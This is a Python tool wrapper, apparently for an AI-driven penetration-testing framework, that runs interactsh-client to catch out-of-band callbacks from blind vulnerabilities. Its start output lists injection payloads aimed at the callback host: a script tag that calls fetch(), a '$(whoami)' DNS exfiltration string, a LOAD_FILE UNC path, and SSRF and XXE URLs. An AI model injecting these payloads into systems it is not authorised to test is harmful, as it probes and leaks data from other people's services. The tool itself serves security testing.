"""Interactsh - out-of-band interaction server for blind vulnerability detection.

Starts a temporary callback server, returns a unique URL to inject into payloads,
then polls for any interactions (DNS, HTTP, SMTP, etc.) to confirm blind vulns.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from cannon.tools.base import Tool, ToolResult, registry


class InteractshTool(Tool):
    name = "interactsh"
    description = (
        "Out-of-band (OOB) interaction server for detecting blind vulnerabilities. "
        "Use action='start' to get a unique callback URL, inject it into payloads "
        "(blind XSS, blind SSRF, blind XXE, blind SQLi, etc.), then use action='poll' "
        "to check if the target made any callbacks. Use action='stop' when done. "
        "This is essential for finding blind vulnerabilities that don't reflect in responses."
    )
    binary = "interactsh-client"

    def build_args(self, **kwargs: Any) -> list[str]:
        return []

    def is_available(self) -> bool:
        import shutil
        return shutil.which(self.binary) is not None

    async def run(self, **kwargs: Any) -> ToolResult:
        action = kwargs.get("action", "start")

        if action == "start":
            return await self._start(kwargs)
        elif action == "poll":
            return await self._poll(kwargs)
        elif action == "stop":
            return await self._stop(kwargs)
        else:
            return ToolResult(
                tool_name=self.name,
                command="interactsh",
                stdout="",
                stderr=f"Unknown action: {action}. Use 'start', 'poll', or 'stop'.",
                return_code=1,
            )

    async def _start(self, kwargs: dict) -> ToolResult:
        """Start interactsh-client and capture the generated URL."""
        poll_interval = kwargs.get("poll_interval", 5)

        proc = await asyncio.create_subprocess_exec(
            self.binary, "-json", "-ps", "-poll-interval", str(poll_interval),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        # Read lines until we get the URL (interactsh prints it first)
        url = ""
        try:
            async with asyncio.timeout(15):
                while True:
                    line = await proc.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode(errors="replace").strip()
                    # interactsh-client prints the URL as a plain line before JSON
                    if ".oast." in decoded or ".interact." in decoded:
                        url = decoded
                        break
                    # Also try parsing JSON output
                    try:
                        obj = json.loads(decoded)
                        if "url" in obj:
                            url = obj["url"]
                            break
                    except json.JSONDecodeError:
                        if decoded and "." in decoded and " " not in decoded:
                            url = decoded
                            break
        except asyncio.TimeoutError:
            proc.kill()
            return ToolResult(
                tool_name=self.name,
                command="interactsh-client -json",
                stdout="",
                stderr="Timeout waiting for interactsh URL",
                return_code=1,
            )

        if not url:
            proc.kill()
            return ToolResult(
                tool_name=self.name,
                command="interactsh-client -json",
                stdout="",
                stderr="Failed to get interactsh callback URL",
                return_code=1,
            )

        # Store the process for polling/stopping
        _active_sessions[url] = proc

        return ToolResult(
            tool_name=self.name,
            command="interactsh-client -json",
            stdout=(
                f"Interactsh callback URL: {url}\n\n"
                f"Inject this URL (or subdomains of it) into your payloads:\n"
                f"  - Blind SSRF: http://{url}\n"
                f"  - Blind XXE: http://{url}/xxe\n"
                f"  - Blind XSS: <script>fetch('http://{url}/xss')</script>\n"
                f"  - DNS exfil: $(whoami).{url}\n"
                f"  - Blind SQLi: LOAD_FILE('\\\\\\\\{url}\\\\a')\n\n"
                f"After injecting payloads, use action='poll' with this URL to check for callbacks."
            ),
            stderr="",
            return_code=0,
        )

    async def _poll(self, kwargs: dict) -> ToolResult:
        """Poll for interactions on the callback URL."""
        url = kwargs.get("url", "")
        timeout = kwargs.get("timeout", 10)

        proc = _active_sessions.get(url)
        if not proc:
            return ToolResult(
                tool_name=self.name,
                command="interactsh poll",
                stdout="",
                stderr=f"No active session for URL: {url}. Start one first.",
                return_code=1,
            )

        interactions = []
        try:
            async with asyncio.timeout(timeout):
                while True:
                    line = await proc.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode(errors="replace").strip()
                    if not decoded:
                        continue
                    try:
                        obj = json.loads(decoded)
                        interactions.append(obj)
                    except json.JSONDecodeError:
                        continue
        except asyncio.TimeoutError:
            pass  # Normal — we poll for `timeout` seconds then return

        if not interactions:
            return ToolResult(
                tool_name=self.name,
                command=f"interactsh poll ({timeout}s)",
                stdout=f"No interactions received after {timeout}s. The target did not call back.",
                stderr="",
                return_code=0,
            )

        lines = [f"Received {len(interactions)} interaction(s)!\n"]
        for i, obj in enumerate(interactions, 1):
            protocol = obj.get("protocol", "unknown")
            remote_addr = obj.get("remote-address", "?")
            raw_req = obj.get("raw-request", "")[:500]
            lines.append(f"--- Interaction {i} ---")
            lines.append(f"Protocol: {protocol}")
            lines.append(f"Remote: {remote_addr}")
            if raw_req:
                lines.append(f"Request:\n{raw_req}")
            lines.append("")

        return ToolResult(
            tool_name=self.name,
            command=f"interactsh poll ({timeout}s)",
            stdout="\n".join(lines),
            stderr="",
            return_code=0,
        )

    async def _stop(self, kwargs: dict) -> ToolResult:
        """Stop an interactsh session."""
        url = kwargs.get("url", "")
        proc = _active_sessions.pop(url, None)
        if proc:
            proc.kill()
            await proc.wait()
            return ToolResult(
                tool_name=self.name,
                command="interactsh stop",
                stdout=f"Interactsh session stopped for {url}",
                stderr="",
                return_code=0,
            )
        return ToolResult(
            tool_name=self.name,
            command="interactsh stop",
            stdout="No active session to stop.",
            stderr="",
            return_code=0,
        )

    def openai_schema(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["start", "poll", "stop"],
                        "description": (
                            "'start' to get a callback URL, "
                            "'poll' to check for interactions, "
                            "'stop' to end the session"
                        ),
                    },
                    "url": {
                        "type": "string",
                        "description": "The interactsh callback URL (required for 'poll' and 'stop')",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Seconds to wait when polling for interactions (default: 10)",
                        "default": 10,
                    },
                    "poll_interval": {
                        "type": "integer",
                        "description": "Interval in seconds between server polls (default: 5, for 'start' only)",
                        "default": 5,
                    },
                },
                "required": ["action"],
            },
        }


# Track active interactsh processes
_active_sessions: dict[str, asyncio.subprocess.Process] = {}


registry.register(InteractshTool())
